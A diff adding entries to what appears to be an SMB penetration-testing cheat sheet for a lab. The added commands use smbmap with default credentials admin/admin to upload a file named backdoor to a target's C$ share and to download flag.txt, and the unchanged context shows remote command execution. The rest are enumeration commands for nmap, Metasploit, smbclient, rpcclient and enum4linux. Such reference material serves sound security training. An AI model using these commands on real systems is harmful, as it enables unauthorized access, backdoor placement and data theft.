@@ -125,10 +125,43 @@ smbmap -u admin -p admin -x . -H 10.10.20.2 -x 'ipconfig'
 ```
 smbmap -H 10.10.20.2 -u admin -p 'admin' -r 'C$'
 ```
-
-
-
-
+Upload Backdoor:
+```
+smbmap -H 10.10.20.2 -u admin -p 'admin' --upload '/root/backdoor' 'C$\backdoor'
+```
+Download file:
+```
+smbmap -H 10.10.20.2 -u admin -p 'admin' --download 'C$\flag.txt'
+```
+```
+nmap 10.10.20.3 -p 445 --script smb-os-discovery
+```
+Metasploit:
+```
+use auxiliary/scanner/smb/smb_version
+```
+```
+use auxiliary/scanner/smb/smb2
+```
+```
+use auxiliary/scanner/smb/smb_enumshares
+```
+nmblookup:
+```
+nmblookup -A 10.10.20.2
+```
+smbclient:
+```
+smbclient -L 10.10.20.3 -N
+```
+rpcclient:
+```
+rpcclient -U "" 10.10.20.3
+```
+enum4linux:
+```
+enum4linux -o 10.10.20.3
+```
 
 
 
